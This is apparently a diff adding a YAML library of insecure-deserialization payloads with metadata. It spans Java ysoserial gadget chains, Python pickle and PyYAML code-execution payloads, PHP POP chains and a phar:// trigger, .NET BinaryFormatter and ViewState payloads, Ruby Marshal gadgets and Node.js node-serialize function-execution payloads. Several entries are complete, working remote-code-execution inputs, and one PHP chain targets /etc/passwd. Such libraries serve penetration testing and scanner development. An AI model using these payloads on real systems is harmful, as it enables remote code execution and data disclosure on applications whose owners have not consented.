@@ -1,0 +1,215 @@
+# Insecure Deserialization Payloads with Metadata
+# Usage: Filter by type (language/framework) and context
+# WARNING: Deserialization exploits can cause RCE — test only in isolated environments
+
+payloads:
+  # Java — ysoserial gadget chains
+  - payload: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA..."
+    type: Java
+    technique: ysoserial-CommonsCollections1
+    context: [HTTP-body, cookie, parameter]
+    detection: command-execution
+    note: "Base64-encoded Java serialized object — CommonsCollections1 chain"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  - payload: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA..."
+    type: Java
+    technique: ysoserial-CommonsCollections5
+    context: [HTTP-body, cookie, parameter]
+    detection: command-execution
+    note: "CommonsCollections5 chain — works on commons-collections 3.1"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  - payload: "rO0ABXNyABRqYXZhLm5ldC5VUkwuSGFuZGxl..."
+    type: Java
+    technique: ysoserial-URLDNS
+    context: [HTTP-body, cookie, parameter]
+    detection: dns-lookup
+    note: "URLDNS chain — no gadget dependency, triggers DNS lookup to confirm deserialization"
+
+  - payload: "rO0ABXNyACpvcmcuYXBhY2hlLmNvbW1vbnMu..."
+    type: Java
+    technique: ysoserial-CommonsCollections7
+    context: [HTTP-body, cookie, parameter]
+    detection: command-execution
+    note: "CommonsCollections7 — uses Hashtable-based trigger"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  - payload: "rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50Lk..."
+    type: Java
+    technique: ysoserial-JRMPClient
+    context: [HTTP-body, cookie, parameter]
+    detection: reverse-connection
+    note: "JRMPClient — triggers outbound JRMP connection to attacker listener"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  # Java — magic bytes detection
+  - payload: "aced0005"
+    type: Java
+    technique: magic-bytes-hex
+    context: [HTTP-body, cookie, parameter]
+    detection: serialization-marker
+    note: "Java serialization magic bytes (hex) — look for this prefix in responses or stored data"
+
+  - payload: "rO0AB"
+    type: Java
+    technique: magic-bytes-base64
+    context: [HTTP-body, cookie, parameter]
+    detection: serialization-marker
+    note: "Java serialization magic bytes (base64) — look for this prefix in cookies or parameters"
+
+  - payload: "H4sIAAAAAAAA"
+    type: Java
+    technique: gzip-serialized
+    context: [HTTP-body, cookie]
+    detection: serialization-marker
+    note: "Gzip-compressed Java serialized object (base64) — common in ViewState"
+
+  # Python — pickle RCE
+  - payload: "cos\nsystem\n(S'id'\ntR."
+    type: Python
+    technique: pickle-rce
+    context: [HTTP-body, cookie, parameter]
+    detection: command-execution
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  - payload: "gASVKAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg=="
+    type: Python
+    technique: pickle-rce-base64
+    context: [HTTP-body, cookie, parameter]
+    detection: command-execution
+    note: "Base64-encoded pickle payload — os.system('id')"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  - payload: |
+      import pickle, os
+      class Exploit(object):
+          def __reduce__(self):
+              return (os.system, ('id',))
+      pickle.dumps(Exploit())
+    type: Python
+    technique: pickle-reduce-template
+    context: [HTTP-body, cookie]
+    detection: command-execution
+    note: "Template for generating custom pickle payloads via __reduce__"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  - payload: "!!python/object/apply:os.system ['id']"
+    type: Python
+    technique: yaml-unsafe-load
+    context: [HTTP-body, configuration-file]
+    detection: command-execution
+    note: "PyYAML unsafe deserialization via yaml.load() without Loader"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  - payload: "!!python/object/new:subprocess.check_output [['id']]"
+    type: Python
+    technique: yaml-subprocess
+    context: [HTTP-body, configuration-file]
+    detection: command-execution
+    note: "PyYAML RCE via subprocess — requires yaml.load() without safe Loader"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  # PHP — unserialize POP chains
+  - payload: 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}'
+    type: PHP
+    technique: unserialize-basic
+    context: [HTTP-body, cookie, parameter]
+    detection: object-instantiation
+    note: "Basic PHP serialized object — test if unserialize() is reachable"
+
+  - payload: 'O:14:"BadMethodClass":1:{s:3:"cmd";s:2:"id";}'
+    type: PHP
+    technique: unserialize-pop-chain
+    context: [HTTP-body, cookie, parameter]
+    detection: command-execution
+    note: "PHP POP chain template — requires a class with __destruct() or __wakeup() calling system()"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  - payload: 'a:2:{i:0;s:4:"test";i:1;O:8:"stdClass":0:{}}'
+    type: PHP
+    technique: unserialize-array-injection
+    context: [HTTP-body, cookie, parameter]
+    detection: object-instantiation
+    note: "Nested array with injected object — bypasses type checks on outer structure"
+
+  - payload: "phar://uploads/evil.phar/test.txt"
+    type: PHP
+    technique: phar-deserialization
+    context: [file-operation, include-path]
+    detection: object-instantiation
+    note: "Triggers deserialization via phar:// stream wrapper on file operations (file_exists, fopen, etc.)"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  - payload: 'O:7:"Archive":1:{s:8:"filename";s:11:"/etc/passwd";}'
+    type: PHP
+    technique: unserialize-file-read
+    context: [HTTP-body, cookie]
+    detection: file-disclosure
+    note: "PHP POP chain targeting file-read via __toString() or __destruct()"
+
+  # .NET — BinaryFormatter, ObjectStateFormatter, ViewState
+  - payload: "AAEAAAD/////AQAAAA..."
+    type: .NET
+    technique: BinaryFormatter
+    context: [HTTP-body, cookie, ViewState]
+    detection: command-execution
+    note: "Base64-encoded BinaryFormatter payload — look for AAEAAAD///// prefix"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  - payload: "/wEy..."
+    type: .NET
+    technique: ObjectStateFormatter
+    context: [ViewState, hidden-field]
+    detection: serialization-marker
+    note: "ASP.NET ViewState — ObjectStateFormatter payload prefix"
+
+  - payload: "__VIEWSTATE=/wEPDwULLTE2..."
+    type: .NET
+    technique: ViewState-unprotected
+    context: [ViewState, hidden-field]
+    detection: serialization-marker
+    note: "Unprotected ViewState — no MAC validation, can be tampered"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  - payload: "ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c 'id'"
+    type: .NET
+    technique: ysoserial-net-TypeConfuseDelegate
+    context: [HTTP-body, cookie, ViewState]
+    detection: command-execution
+    note: "ysoserial.net command to generate TypeConfuseDelegate payload"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  # Ruby — Marshal.load
+  - payload: "\x04\x08o:\x15Gem::Requirement\x06..."
+    type: Ruby
+    technique: marshal-load
+    context: [HTTP-body, cookie, parameter]
+    detection: command-execution
+    note: "Ruby Marshal.load payload — Gem::Requirement gadget chain"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  - payload: "BAhvOhhHZW06OlJlcXVpcmVtZW50..."
+    type: Ruby
+    technique: marshal-load-base64
+    context: [HTTP-body, cookie, parameter]
+    detection: command-execution
+    note: "Base64-encoded Ruby Marshal payload — look for BAh prefix"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  # Node.js — node-serialize
+  - payload: '{"rce":"_$$ND_FUNC$$_function(){require(''child_process'').execSync(''id'')}()"}'
+    type: Node.js
+    technique: node-serialize-rce
+    context: [HTTP-body, cookie, parameter]
+    detection: command-execution
+    note: "node-serialize IIFE payload — $$ND_FUNC$$ prefix triggers function execution"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
+
+  - payload: '{"username":"_$$ND_FUNC$$_function(){return require(''child_process'').execSync(''whoami'').toString()}()"}'
+    type: Node.js
+    technique: node-serialize-rce-field
+    context: [HTTP-body, cookie]
+    detection: command-execution
+    note: "node-serialize payload injected into specific field"
+    warning: "Deserialization exploits can cause RCE — test only in isolated environments"
